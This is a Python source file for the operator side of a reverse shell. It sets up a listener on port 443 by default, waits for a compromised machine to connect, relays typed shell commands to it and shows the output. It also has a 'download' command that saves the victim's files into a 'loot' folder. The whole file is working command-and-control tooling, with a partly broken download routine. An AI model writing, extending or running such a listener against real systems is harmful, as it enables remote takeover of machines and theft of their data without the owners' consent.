import os.path
import socket
import tqdm
from argparse import ArgumentParser as AP


class RvsServer:

    def __init__(self, hostip, port_number, buffer_size, separator_string, listen_timeout, prompt_delimiter):
        self.server_host = hostip
        self.server_port = port_number
        self.buffer_size = buffer_size
        self.separator = separator_string
        self.listen_to = listen_timeout
        self.loot_dir = os.getcwd() + "/loot"
        self.cwd = ""
        # Prompt variables
        self.prompt_del = prompt_delimiter

    def run(self):
        try:
            sock = socket.socket()

            # Bind the socket to all IP address of this host
            sock.bind((self.server_host, int(self.server_port)))

            # Listen for connections
            sock.listen(self.listen_to)
            ServerAddIns.print_status_listening(self.server_host, self.server_port)

            # Except any connection attempts made to the server
            cs, ca = sock.accept()
            ServerAddIns.print_info(f"{ca[0]} : {ca[1]} connected to the server!")

            # Receive the Current Working Directory
            self.cwd = cs.recv(self.buffer_size).decode()
            ServerAddIns.print_status_success(f"Established, current directory is {self.cwd}")

            # Main server prompt
            while True:
                # Establish a prompt for the server end. The prompt will be the systems
                # primary shell.
                cmd = input(f"{self.cwd} : {self.prompt_del}")

                # Establish command delimiters
                basic_del = cmd.split(":")
                out_del = cmd.split(">")

                if not cmd.strip():
                    # Command is empty
                    continue

                # Send the command to the client
                cs.send(cmd.encode())

                # From here, establish commands not native to the shell
                if cmd.lower() == "exit":
                    break

                if cmd.lower() == "download":
                    # Download object. Get the filename to download by splitting the command
                    # Input module
                    data_file = basic_del[1]
                    cs.send(data_file)

                    _ServerMeta.download(self.loot_dir, cs)

                    pass

                # Clean up and output retrieval
                output = cs.recv(self.buffer_size).decode()

                # Split command output and CWD
                res, self.cwd = output.split(self.separator)

                # Print the output
                ServerAddIns.print_cmd_results(ca[0], ca[1], res)
        except KeyboardInterrupt:
            ServerAddIns.print_info("Keyboard Interrupt...\n")
            exit(0)


class ServerAddIns:

    def __init__(self):
        pass

    @staticmethod
    def print_status_listening(host, port):
        print(f"\033[34m[*]\033[37m Listener initialized -> {host} : {port}...\033[0m")

    @staticmethod
    def print_status_success(message):
        print(f"\033[32m[+]\033[37m {message}.\033[0m")

    @staticmethod
    def print_info(message):
        print(f"\033[37m[I] {message}\033[0m")

    @staticmethod
    def print_cmd_results(host, port, results):
        print(f"\033[01;33m++ Results received from {host} : {port}:\n\n\033[37m{results}\033[0m\n")

class _ServerMeta:

    def __init__(self):
        pass

    @staticmethod
    def download(loot_dir, client, sep="<sep>", buffer_size=4096):
        """
        For the download command. The server will first send to the client the file that will be downloaded. Then
        the server will respond accordingly

        :param loot_dir:
                The loot directory...for storing downloaded material

        :param sep:
                Net separator for bulk transmission

        :param sock:
                The current socket in use

        :param client:
                The client socket

        :param buffer_size:
                The amount of allowed time for processing

        :return:
        """
        recvd = client.recv(buffer_size).decode()
        filename, filesize = recvd.split(sep)

        # Removes the ABSOLUTE filename
        filename = os.path.basename(filename)

        filesize = int(filesize)
        # The server side progress bar
        progress = tqdm.tqdm(range(filesize), f"++ Receiving file: {filename}:", unit="B", unit_scale=True, unit_divisor=1024)

        # Begin stream
        with open(filename, "wb") as loot:
            while True:
                br = client.recv(buffer_size)

                if not br:
                    print(f"\033[32m[+]\033[37m Download complete! Saved in: {loot_dir}")
                    break
                loot.write(br)
                progress.update(len(br))

        pass

    @staticmethod
    def upload(sock, client, buffer_size=4096):
        pass


def main():
    parse = AP(usage="server.py -i -H <IP> -p <PORT> -b <BUFFER_SIZE> -s <SEPARATOR_STRING> -t <TIMEOUT (SEC)> -p "
                     "<SERVER PROMPT DELIMITER>", conflict_handler="resolve")
    parse.add_argument('-i', '--init', dest="server_init", required=True, action="store_true", help="Initialize main "
                                                                                                    "server..")
    parse.add_argument('-H', '--hostip', default="0.0.0.0", metavar="", type=str, dest="server_ip",
                       help="Set the IP address for the server to listen to"
                            "use \"0.0.0.0\" to accept ANY connection.")
    parse.add_argument('-p', '--port', default=443, type=int, metavar="", dest="server_port",
                       help="Set the port number for the server to listen on.")
    parse.add_argument('-b', '--buffer-size', default=(1024 * 998), type=int, metavar="", dest="server_buffer_size",
                       help="Set the server comm buffer "
                            "buffer size.")
    parse.add_argument('-s', '--sep', default="<sep>", type=str, metavar="", dest="server_sep",
                       help="Set the communication separator for separating "
                            "output default: \"<sep>\"")
    parse.add_argument('-t', '--timeout', default=5, type=int, metavar="", dest="server_timeout",
                       help="Set the servers listen timeout in seconds.")
    parse.add_argument('-p', '--prompt', default="> ", type=str, metavar="", dest="server_cmd_prompt",
                       help="Servers prompt delimiter.")

    args = parse.parse_args()

    if args.server_init:
        srv = RvsServer(args.server_ip, args.server_port, args.server_buffer_size, args.server_sep, args.server_timeout,
                        args.server_cmd_prompt)
        srv.run()
    else:
        print("\nMissing argument -I/--init...\n");
        exit(1)


if __name__ == '__main__':
    main()
